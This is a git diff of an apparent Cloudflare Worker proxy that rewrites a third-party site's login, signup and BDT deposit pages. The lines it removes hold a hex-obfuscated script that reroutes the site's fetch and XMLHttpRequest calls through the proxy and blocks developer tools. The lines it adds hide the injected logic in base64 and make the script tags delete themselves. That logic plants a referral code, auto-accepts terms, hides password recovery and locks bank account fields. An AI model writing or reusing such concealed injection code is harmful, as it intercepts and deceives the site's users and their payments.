@@ -12,18 +12,16 @@ export default {
     const url = new URL(request.url);
     const originHeader = request.headers.get("Origin") || `https://${url.host}`;
 
-    // 🛡️ প্রফেশনাল সিকিউরিটি: Advanced Monkey Patch & Anti-Theft System
+    // 🛡️ প্রফেশনাল সিকিউরিটি: Ghost Script Route (লগইন ফিক্স করে আপডেট করা হয়েছে)
     if (url.pathname === '/__secure_core.js') {
-        const referer = request.headers.get("Referer");
-        if (!referer || !referer.includes(url.hostname)) {
-            return new Response(`console.log("Access Denied: Highly Secured Proxy System 😎");`, {
-                status: 200, headers: { "Content-Type": "application/javascript" }
-            });
-        }
-        
-        // 🔥 সম্পূর্ণ হেক্স এনকোডেড এবং অ্যান্টি-ডিব্যাগিং মানকি প্যাচ স্ক্রিপ্ট
-        const secretCode = `!function(){const _0x1a2b=["\\x6C\\x69\\x76\\x61\\x70\\x69\\x32\\x34\\x37\\x2E\\x6C\\x69\\x76\\x65","\\x74\\x76\\x2E\\x6E\\x67\\x69\\x6E\\x78\\x30\\x2E\\x63\\x6F\\x6D","\\x2F\\x5F\\x5F\\x61\\x70\\x69\\x5F\\x70\\x72\\x6F\\x78\\x79\\x2F"];function _0x2b3c(u){return typeof u==="string"&&!u.includes(_0x1a2b[2])&&(_0x1a2b[0]===u||_0x1a2b[1]===u||u.includes(_0x1a2b[0])||u.includes(_0x1a2b[1]))}const _0x3c4d=window.fetch;window.fetch=async function(...args){try{if(_0x2b3c(args[0]))args[0]=_0x1a2b[2]+args[0];else if(args[0] instanceof Request&&_0x2b3c(args[0].url))args[0]=new Request(_0x1a2b[2]+args[0].url,args[0])}catch(e){}return _0x3c4d.apply(this,args)};const _0x4d5e=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u,...rest){try{if(_0x2b3c(u))u=_0x1a2b[2]+u}catch(e){}return _0x4d5e.call(this,m,u,...rest)};setInterval(function(){const d=new Date();debugger;if(new Date()-d>100){window.location.reload();}},500);document.addEventListener('contextmenu',e=>e.preventDefault());document.onkeydown=function(e){if(e.keyCode==123||(e.ctrlKey&&e.shiftKey&&(e.keyCode==73||e.keyCode==67||e.keyCode==74))||(e.ctrlKey&&e.keyCode==85))return false;}}();`;
-        
+        const secretCode = `
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.onkeydown = function(e) {
+            if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 67 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
+                return false;
+            }
+        };
+        `;
         return new Response(secretCode, {
             status: 200, headers: { "Content-Type": "application/javascript", "Cache-Control": "no-cache, no-store, must-revalidate" }
         });
@@ -106,111 +104,56 @@ export default {
 
         if (contentType.includes("text/html")) {
             
-            // 🚀 CSS & JS ইনজেকশন
-            const customStylesAndScripts = `
-            <style>
-              /* ==========================================
-                 🎨 সাইনআপ এবং লগইন পেজের আপডেট ডিজাইন
-                 ========================================== */
-              .page-signup body, .page-login body { background-color: #121212 !important; }
-              .page-signup .chakra-form-control .chakra-input-group,
-              .page-login .chakra-form-control .chakra-input-group { background-color: transparent !important; border: none !important; }
-              .page-signup .chakra-input,
-              .page-login .chakra-input { height: 45px !important; background-color: #2c2c2c !important; border-radius: 4px !important; border: 1px solid #4e4e4e !important; color: #ffffff !important; }
-              .page-signup .chakra-input::placeholder,
-              .page-login .chakra-input::placeholder { color: #808080 !important; }
-              .page-login button.css-1u9t1b5, .page-login .css-1u9t1b5 { display: none !important; }
-              .page-signup .chakra-input__right-element, .page-login .chakra-input__right-element { height: 45px !important; display: flex !important; align-items: center !important; justify-content: center !important; top: 0 !important; }
-              .page-signup .chakra-input__right-element button, .page-login .chakra-input__right-element button { height: 100% !important; width: 100% !important; display: flex !important; align-items: center !important; justify-content: center !important; border-radius: 0 !important; padding: 0 !important; margin: 0 !important; }
-              .page-signup .chakra-input__right-element svg, .page-login .chakra-input__right-element svg { display: block !important; margin: auto !important; position: relative !important; top: 2.5px !important; }
-              .page-signup .chakra-input__left-addon { background-color: #2c2c2c !important; border-radius: 4px !important; border: 1px solid #4e4e4e !important; color: #ffffff !important; font-weight: 500 !important; height: 45px !important; margin-right: 10px !important; }
-              .page-signup .chakra-input__left-addon img.chakra-image { margin-right: 5px !important; }
-              .page-signup .chakra-input__right-addon { background-color: #EEEEEE !important; border-radius: 4px !important; border: 1px solid #4e4e4e !important; color: #121212 !important; font-weight: 700 !important; height: 45px !important; margin-left: 10px !important; padding: 5px 8px !important; display: flex !important; align-items: center !important; justify-content: center !important; }
-              .page-signup .chakra-input__right-addon button { margin: auto 0 auto 5px !important; display: flex !important; align-items: center !important; justify-content: center !important; height: 26px !important; width: 26px !important; min-width: 26px !important; border-radius: 4px !important; padding: 0 !important; background-color: transparent !important; }
-              .page-signup .chakra-input__right-addon button svg, .page-signup .chakra-input__right-addon svg { height: 16px !important; width: 16px !important; margin: auto !important; color: #121212 !important; }
-              .css-fpyqtb { margin-bottom: 10px !important; }
-              button.chakra-button.css-lutoi4 { height: 45px !important; border-radius: 4px !important; }
-              .page-login img.css-if5ddh { display: none !important; }
-              .page-signup p.css-19szwf6 { display: none !important; }
-              .page-login body, .page-signup body, .page-login html, .page-signup html { overscroll-behavior-y: none !important; }
-              .page-login .css-b13tmd { height: 100vh !important; max-height: 100vh !important; overflow: hidden !important; }
-              .page-signup .css-16ff8oy, .page-signup .css-b13tmd { padding-bottom: 10px !important; margin-bottom: 0 !important; }
-              .page-login div[style*="height: 60px"], .page-signup div[style*="height: 60px"], .page-login div[style*="height: 70px"], .page-signup div[style*="height: 70px"], .page-login div[style*="height: 80px"], .page-signup div[style*="height: 80px"], .page-login div[style*="height: 90px"], .page-signup div[style*="height: 90px"], .page-signup .css-16ff8oy > div[style*="height"], .page-signup .css-b13tmd > div[style*="height"] { display: none !important; height: 0 !important; min-height: 0 !important; }
+            // =====================================================================
+            // 🚀 মূল কাস্টম লজিক (যা এনক্রিপ্ট হয়ে ব্রাউজারে যাবে এবং পরে ডিলিট হবে)
+            // =====================================================================
+            const rawCustomLogic = `
+                // --- কাস্টম CSS ইনজেকশন ---
+                const customStyle = document.createElement('style');
+                customStyle.textContent = \`
+                  .page-signup body, .page-login body { background-color: #121212 !important; }
+                  .page-signup .chakra-form-control .chakra-input-group,
+                  .page-login .chakra-form-control .chakra-input-group { background-color: transparent !important; border: none !important; }
+                  .page-signup .chakra-input,
+                  .page-login .chakra-input { height: 45px !important; background-color: #2c2c2c !important; border-radius: 4px !important; border: 1px solid #4e4e4e !important; color: #ffffff !important; }
+                  .page-signup .chakra-input::placeholder,
+                  .page-login .chakra-input::placeholder { color: #808080 !important; }
+                  .page-login button.css-1u9t1b5, .page-login .css-1u9t1b5 { display: none !important; }
+                  .page-signup .chakra-input__right-element, .page-login .chakra-input__right-element { height: 45px !important; display: flex !important; align-items: center !important; justify-content: center !important; top: 0 !important; }
+                  .page-signup .chakra-input__right-element button, .page-login .chakra-input__right-element button { height: 100% !important; width: 100% !important; display: flex !important; align-items: center !important; justify-content: center !important; border-radius: 0 !important; padding: 0 !important; margin: 0 !important; }
+                  .page-signup .chakra-input__right-element svg, .page-login .chakra-input__right-element svg { display: block !important; margin: auto !important; position: relative !important; top: 2.5px !important; }
+                  .page-signup .chakra-input__left-addon { background-color: #2c2c2c !important; border-radius: 4px !important; border: 1px solid #4e4e4e !important; color: #ffffff !important; font-weight: 500 !important; height: 45px !important; margin-right: 10px !important; }
+                  .page-signup .chakra-input__left-addon img.chakra-image { margin-right: 5px !important; }
+                  .page-signup .chakra-input__right-addon { background-color: #EEEEEE !important; border-radius: 4px !important; border: 1px solid #4e4e4e !important; color: #121212 !important; font-weight: 700 !important; height: 45px !important; margin-left: 10px !important; padding: 5px 8px !important; display: flex !important; align-items: center !important; justify-content: center !important; }
+                  .page-signup .chakra-input__right-addon button { margin: auto 0 auto 5px !important; display: flex !important; align-items: center !important; justify-content: center !important; height: 26px !important; width: 26px !important; min-width: 26px !important; border-radius: 4px !important; padding: 0 !important; background-color: transparent !important; }
+                  .page-signup .chakra-input__right-addon button svg, .page-signup .chakra-input__right-addon svg { height: 16px !important; width: 16px !important; margin: auto !important; color: #121212 !important; }
+                  .css-fpyqtb { margin-bottom: 10px !important; }
+                  button.chakra-button.css-lutoi4 { height: 45px !important; border-radius: 4px !important; }
+                  .page-login img.css-if5ddh { display: none !important; }
+                  .page-signup p.css-19szwf6 { display: none !important; }
+                  .page-login body, .page-signup body, .page-login html, .page-signup html { overscroll-behavior-y: none !important; }
+                  .page-login .css-b13tmd { height: 100vh !important; max-height: 100vh !important; overflow: hidden !important; }
+                  .page-signup .css-16ff8oy, .page-signup .css-b13tmd { padding-bottom: 10px !important; margin-bottom: 0 !important; }
+                  .page-login div[style*="height: 60px"], .page-signup div[style*="height: 60px"], .page-login div[style*="height: 70px"], .page-signup div[style*="height: 70px"], .page-login div[style*="height: 80px"], .page-signup div[style*="height: 80px"], .page-login div[style*="height: 90px"], .page-signup div[style*="height: 90px"], .page-signup .css-16ff8oy > div[style*="height"], .page-signup .css-b13tmd > div[style*="height"] { display: none !important; height: 0 !important; min-height: 0 !important; }
+                  .custom-video-wrapper { position: relative !important; width: 100% !important; padding: 0 !important; margin: 0 !important; display: flex !important; align-items: center !important; justify-content: center !important; background-color: transparent !important; min-height: 150px; }
+                  .custom-video-wrapper video { width: 100% !important; height: auto !important; display: block !important; object-fit: cover !important; pointer-events: none !important; opacity: 0; transition: opacity 0.5s ease-in-out; }
+                  .ios-spinner { position: absolute; width: 32px; height: 32px; z-index: 10; transition: opacity 0.3s ease-out; }
+                  .ios-spinner::after { content: ""; display: block; width: 100%; height: 100%; background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg viewBox=\\'0 0 100 100\\' xmlns=\\'http://www.w3.org/2000/svg\\'%3E%3Cg fill=\\'none\\' stroke=\\'%23ffffff\\' stroke-width=\\'8\\' stroke-linecap=\\'round\\'%3E%3Cpath d=\\'M50 15V25\\' opacity=\\'.2\\'/%3E%3Cpath d=\\'M50 15V25\\' transform=\\'rotate(45 50 50)\\' opacity=\\'.3\\'/%3E%3Cpath d=\\'M50 15V25\\' transform=\\'rotate(90 50 50)\\' opacity=\\'.4\\'/%3E%3Cpath d=\\'M50 15V25\\' transform=\\'rotate(135 50 50)\\' opacity=\\'.5\\'/%3E%3Cpath d=\\'M50 15V25\\' transform=\\'rotate(180 50 50)\\' opacity=\\'.6\\'/%3E%3Cpath d=\\'M50 15V25\\' transform=\\'rotate(225 50 50)\\' opacity=\\'.7\\'/%3E%3Cpath d=\\'M50 15V25\\' transform=\\'rotate(270 50 50)\\' opacity=\\'.8\\'/%3E%3Cpath d=\\'M50 15V25\\' transform=\\'rotate(315 50 50)\\' opacity=\\'1\\'/%3E%3C/g%3E%3C/svg%3E"); background-size: cover; animation: ios-spin 1s steps(8, end) infinite; }
+                  @keyframes ios-spin { 100% { transform: rotate(360deg); } }
 
-              /* Video Styles */
-              .custom-video-wrapper { position: relative !important; width: 100% !important; padding: 0 !important; margin: 0 !important; display: flex !important; align-items: center !important; justify-content: center !important; background-color: transparent !important; min-height: 150px; }
-              .custom-video-wrapper video { width: 100% !important; height: auto !important; display: block !important; object-fit: cover !important; pointer-events: none !important; opacity: 0; transition: opacity 0.5s ease-in-out; }
-              .ios-spinner { position: absolute; width: 32px; height: 32px; z-index: 10; transition: opacity 0.3s ease-out; }
-              .ios-spinner::after { content: ""; display: block; width: 100%; height: 100%; background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' stroke='%23ffffff' stroke-width='8' stroke-linecap='round'%3E%3Cpath d='M50 15V25' opacity='.2'/%3E%3Cpath d='M50 15V25' transform='rotate(45 50 50)' opacity='.3'/%3E%3Cpath d='M50 15V25' transform='rotate(90 50 50)' opacity='.4'/%3E%3Cpath d='M50 15V25' transform='rotate(135 50 50)' opacity='.5'/%3E%3Cpath d='M50 15V25' transform='rotate(180 50 50)' opacity='.6'/%3E%3Cpath d='M50 15V25' transform='rotate(225 50 50)' opacity='.7'/%3E%3Cpath d='M50 15V25' transform='rotate(270 50 50)' opacity='.8'/%3E%3Cpath d='M50 15V25' transform='rotate(315 50 50)' opacity='1'/%3E%3C/g%3E%3C/svg%3E"); background-size: cover; animation: ios-spin 1s steps(8, end) infinite; }
-              @keyframes ios-spin { 100% { transform: rotate(360deg); } }
+                  /* === DW পেজ ডিজাইন === */
+                  .page-dw .css-10ici4o { display: none !important; }
+                  .page-dw label.chakra-form__label { pointer-events: none !important; user-select: none !important; }
+                  .page-dw .css-1kzylc3, .page-dw .css-109ik7k, .page-dw .css-1h8d01g { height: 45px !important; border-radius: 4px !important; pointer-events: none !important; user-select: none !important; opacity: 0.9 !important; }
+                  .page-dw .chakra-input { height: 45px !important; border-radius: 4px !important; }
+                  .page-dw .chakra-input__left-addon { height: 45px !important; border-radius: 4px 0 0 4px !important; }
+                  .page-dw .chakra-input__left-addon + .chakra-input { border-radius: 0 4px 4px 0 !important; pointer-events: auto !important; user-select: auto !important; opacity: 1 !important; }
+                  .page-dw .css-8w1h6v { height: 45px !important; border-radius: 4px !important; display: flex !important; align-items: center !important; }
+                  .page-dw .chakra-input__right-element { height: 45px !important; }
+                \`;
+                document.documentElement.appendChild(customStyle);
 
-
-              /* ==========================================
-                 🛑 ডিপোজিট ও উইথড্রয়াল পেজ (/dw) কাস্টম ডিজাইন
-                 ========================================== */
-              
-              /* ১. "Deposit Type" (Online Transfer) ব্লক হাইড */
-              .page-dw .css-10ici4o {
-                  display: none !important;
-              }
-
-              /* ২. 🛑 লেবেল ফ্রিজ (Label Disable): লেখার উপর ক্লিক করে ইনপুট আনলক করা বন্ধ */
-              .page-dw label.chakra-form__label {
-                  pointer-events: none !important;
-                  user-select: none !important;
-              }
-
-              /* ৩. Bank Name ও Acc Number ফ্রিজ করা */
-              .page-dw .css-1kzylc3,
-              .page-dw .css-109ik7k,
-              .page-dw .css-1h8d01g {
-                  height: 45px !important;
-                  border-radius: 4px !important; 
-                  pointer-events: none !important;
-                  user-select: none !important;
-                  opacity: 0.9 !important;
-              }
-
-              /* ৪. ইউনিভার্সাল ইনপুট হাইট (Withdrawal Amount, Phone Number, Transaction ID সব 45px হবে) */
-              .page-dw .chakra-input {
-                  height: 45px !important;
-                  border-radius: 4px !important;
-              }
-
-              /* ৫. ইউনিভার্সাল লেফট অ্যাডঅন (BDT লেবেল এবং পতাকার বক্স 45px হবে) */
-              .page-dw .chakra-input__left-addon {
-                  height: 45px !important;
-                  border-radius: 4px 0 0 4px !important; 
-              }
-
-              /* ৬. 🔥 মাস্টার আনলক (Master Unlock): Amount এবং Phone Number যেন ভুল করেও ফ্রিজ না হয় */
-              .page-dw .chakra-input__left-addon + .chakra-input {
-                  border-radius: 0 4px 4px 0 !important; 
-                  pointer-events: auto !important; /* জোর করে ক্লিক আনলক */
-                  user-select: auto !important;    
-                  opacity: 1 !important;           
-              }
-
-              /* ৭. Upload Receipt বক্স (আপনার ক্লাস css-8w1h6v) */
-              .page-dw .css-8w1h6v {
-                  height: 45px !important;
-                  border-radius: 4px !important;
-                  display: flex !important;
-                  align-items: center !important; 
-              }
-
-              /* ৮. কপি আইকন বাটন ফিক্স */
-              .page-dw .chakra-input__right-element {
-                  height: 45px !important;
-              }
-
-            </style>
-
-            <script>
-              (function(){
-                // ==========================================
-                // 🔄 ডাইনামিক বডি ক্লাস সিস্টেম
-                // ==========================================
+                // --- JS লজিক ---
                 function updateBodyClass() {
                     document.body.className = document.body.className.replace(/\\bpage-[^ ]*[ ]?\\b/g, '');
                     let path = window.location.pathname.replace(/\\//g, '');
@@ -222,10 +165,7 @@ export default {
                 let lastUrl = location.href; 
                 const urlObserver = new MutationObserver(() => {
                   const url = location.href;
-                  if (url !== lastUrl) {
-                    lastUrl = url;
-                    updateBodyClass(); 
-                  }
+                  if (url !== lastUrl) { lastUrl = url; updateBodyClass(); }
                 });
 
                 const REF_CODE = 'iZfmaT3h';
@@ -252,29 +192,21 @@ export default {
                     }
 
                     const phoneInput = document.querySelector('input[placeholder="Phone Number"]');
-                    if (phoneInput && phoneInput.type !== 'tel') {
-                        phoneInput.type = 'tel';
-                    }
+                    if (phoneInput && phoneInput.type !== 'tel') { phoneInput.type = 'tel'; }
 
                     const codeInput = document.querySelector('input[placeholder="Enter 4 digit code"]');
-                    if (codeInput && codeInput.type !== 'number') {
-                        codeInput.type = 'number';
-                    }
+                    if (codeInput && codeInput.type !== 'number') { codeInput.type = 'number'; }
 
                     const agreeCheckbox = document.querySelector('input[type="checkbox"]');
                     if (agreeCheckbox && !agreeCheckbox.hasAttribute('data-auto-checked')) {
-                        if (!agreeCheckbox.checked) {
-                            agreeCheckbox.click();
-                        }
+                        if (!agreeCheckbox.checked) agreeCheckbox.click();
                         agreeCheckbox.setAttribute('data-auto-checked', 'true');
                     }
 
                     document.querySelectorAll('button').forEach(btn => {
                         const txt = btn.textContent.toLowerCase();
                         if (txt.includes('forgot') || txt.includes('password?')) {
-                            if (btn.style.display !== 'none') {
-                                btn.style.setProperty('display', 'none', 'important');
-                            }
+                            if (btn.style.display !== 'none') btn.style.setProperty('display', 'none', 'important');
                         }
                     });
 
@@ -283,23 +215,13 @@ export default {
                         if (btnText === 'Confirm' || btnText === 'Login') {
                             btn.style.setProperty('height', '45px', 'important');
                             btn.style.setProperty('border-radius', '4px', 'important');
-                            if (btnText === 'Login') {
-                                btn.style.setProperty('margin-top', '10px', 'important');
-                            }
+                            if (btnText === 'Login') btn.style.setProperty('margin-top', '10px', 'important');
                         }
                     });
 
                     if (currentPath === 'login' || currentPath === 'signup') {
                         const targetDivForVideo = document.querySelector('div.css-lpwed4');
                         if (targetDivForVideo && !document.getElementById('arfan-custom-video')) {
-                            if (!document.getElementById('preload-custom-vid')) {
-                                const preloadLink = document.createElement('link');
-                                preloadLink.id = 'preload-custom-vid';
-                                preloadLink.rel = 'preload';
-                                preloadLink.as = 'video';
-                                preloadLink.href = VIDEO_URL;
-                                document.head.appendChild(preloadLink);
-                            }
                             const videoHTML = \`
                             <div id="arfan-custom-video" class="custom-video-wrapper">
                                 <div id="arfan-spinner" class="ios-spinner"></div>
@@ -322,11 +244,10 @@ export default {
                         }
                     } else {
                         const existingVideo = document.getElementById('arfan-custom-video');
-                        if (existingVideo) { existingVideo.remove(); }
+                        if (existingVideo) existingVideo.remove();
                     }
 
                     if (currentPath === 'dw') {
-                        
                         document.querySelectorAll('.page-dw .chakra-input__left-addon').forEach(addon => {
                             if (addon.textContent.includes('BDT')) {
                                 let amountInput = addon.nextElementSibling;
@@ -346,7 +267,6 @@ export default {
                             }
                         });
                     }
-
                 });
 
                 window.addEventListener('load', () => {
@@ -354,14 +274,34 @@ export default {
                     urlObserver.observe(document, {subtree: true, childList: true});
                     domObserver.observe(document.body, { childList: true, subtree: true });
                 });
-              })();
-            </script>`;
+            `;
 
-            const ghostScriptTag = `<script src="/__secure_core.js"></script>`;
+            // =====================================================================
+            // 🔒 ক্লাউডফ্লেয়ারের ভেতরেই কোডটি Base64 এ এনকোড করা হচ্ছে
+            // =====================================================================
+            const base64Logic = btoa(unescape(encodeURIComponent(rawCustomLogic)));
+
+            // 🔥 HTML এ এমন একটি স্ক্রিপ্ট পাঠানো হচ্ছে যা দেখতে হিবিজিবি, রান করেই নিজেকে ডিলিট করে দেবে
+            const secureInjectorScript = `
+            <script src="/__secure_core.js"></script>
+            <script id="arfan_secure_init">
+                (function(){
+                    try {
+                        var _0xabc123 = decodeURIComponent(escape(atob("${base64Logic}")));
+                        var _0xsc = document.createElement('script');
+                        _0xsc.textContent = _0xabc123;
+                        document.documentElement.appendChild(_0xsc);
+                        _0xsc.remove(); // ভিতরের স্ক্রিপ্ট ডিলিট
+                    } catch(e) {}
+                    document.getElementById("arfan_secure_init").remove(); // মেইন ট্যাগ ডিলিট
+                })();
+            </script>
+            `;
+
             if (text.includes('<head>')) {
-              text = text.replace('<head>', '<head>' + ghostScriptTag + customStylesAndScripts);
+              text = text.replace('<head>', '<head>' + secureInjectorScript);
             } else {
-              text = ghostScriptTag + customStylesAndScripts + text;
+              text = secureInjectorScript + text;
             }
         }
         
